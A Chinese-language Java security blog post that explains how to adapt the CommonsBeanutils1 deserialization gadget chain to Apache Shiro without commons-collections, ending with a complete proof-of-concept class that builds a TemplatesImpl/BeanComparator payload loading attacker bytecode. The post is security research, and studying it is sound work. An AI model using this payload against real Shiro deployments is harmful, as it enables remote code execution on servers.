# [Java安全] CommonsBeanutils1在Shiro中的利用




# 前言

为什么CB1会和Shiro扯上关系，前面我们研究Shiro反序列化的时候，使用的是P牛的demo，我们可以看到maven项目里是装了一个CC3.2.1的，如果我把这个依赖删除的话

![image-20221006182000927](https://tuchuang.huamang.xyz/img/image-20221006182000927.png)

重新加载maven，可以看到多了一个CB

![image-20221006182215409](https://tuchuang.huamang.xyz/img/image-20221006182215409.png)

也就是说，Shiro是依赖于commons-beanutils的，但是我们却不能直接用我们上一篇文章提到的CB1链去打Shiro，看P牛的Java安全漫谈可以知道，有两个坑

- serialVersionUID必须一致，也就是说服务端的CB版本得和我们生成POC的CB版本一致

>如果两个不同版本的库使用了同一个类，而这两个类可能有一些方法和属性有了变化，此时在序列化通 信的时候就可能因为不兼容导致出现隐患。因此，Java在反序列化的时候提供了一个机制，序列化时会 根据固定算法计算出一个当前类的 serialVersionUID 值，写入数据流中；反序列化时，如果发现对方 的环境中这个类计算出的 serialVersionUID 不同，则反序列化就会异常退出，避免后续的未知隐患

- CB反序列化时需要依赖于CC

> 报错信息为：Unable to load class named [org.apache.commons.collections.comparators.ComparableComparator]
>
> commons-beanutils本来依赖于commons-collections，但是在Shiro中，它的commons-beanutils虽 然包含了一部分commons-collections的类，但却不全。这也导致，正常使用Shiro的时候不需要依赖于 commons-collections，但反序列化利用的时候需要依赖于commons-collections



# 无须依赖CC的利用链

因为之前的报错是：

>Unable to load class named [org.apache.commons.collections.comparators.ComparableComparator]

所以我们去定位到这里，BeanCompare，如果在实例化的时候没有给他传入comparator，那么就会调用这个`ComparableComparator.getInstance()`也就依赖了CC链

![image-20221006191950784](https://tuchuang.huamang.xyz/img/image-20221006191950784.png)

不能用ComparableComparator的话就得找个平替来，需要满足的条件是

- 实现 java.util.Comparator接口
- 实现 java.io.Serializable接口
- Java、shiro或commons-beanutils自带，且兼容性强

这里idea有个快捷键，在mac下是`cmd+alt+b`，可以用来寻找实现了这个接口的类

![image-20221006193408440](https://tuchuang.huamang.xyz/img/image-20221006193408440.png)

可以找到一个`CaseInsensitiveComparator`满足条件，他是java.lang.String下的

![image-20221006193553094](https://tuchuang.huamang.xyz/img/image-20221006193553094.png)

所以我们在创建BeanComparator对象的时候，就可以把这个`String.CASE_INSENSITIVE_ORDER`传进去，绕开对于CC的依赖

最后的POC

```java
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;
import org.apache.commons.beanutils.BeanComparator;

import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class CB1pro {
    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }


    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass clazzz = pool.get("EvilTest");
        byte[] code = clazzz.toBytecode();
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][]{code});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        queue.add("1");
        queue.add("1");

        setFieldValue(comparator, "property", "outputProperties");
        setFieldValue(queue, "queue", new Object[]{obj, obj});

        ByteArrayOutputStream barr = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(barr);
        oos.writeObject(queue);
        oos.close();
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
        Object o = (Object)ois.readObject();

    }
}
```


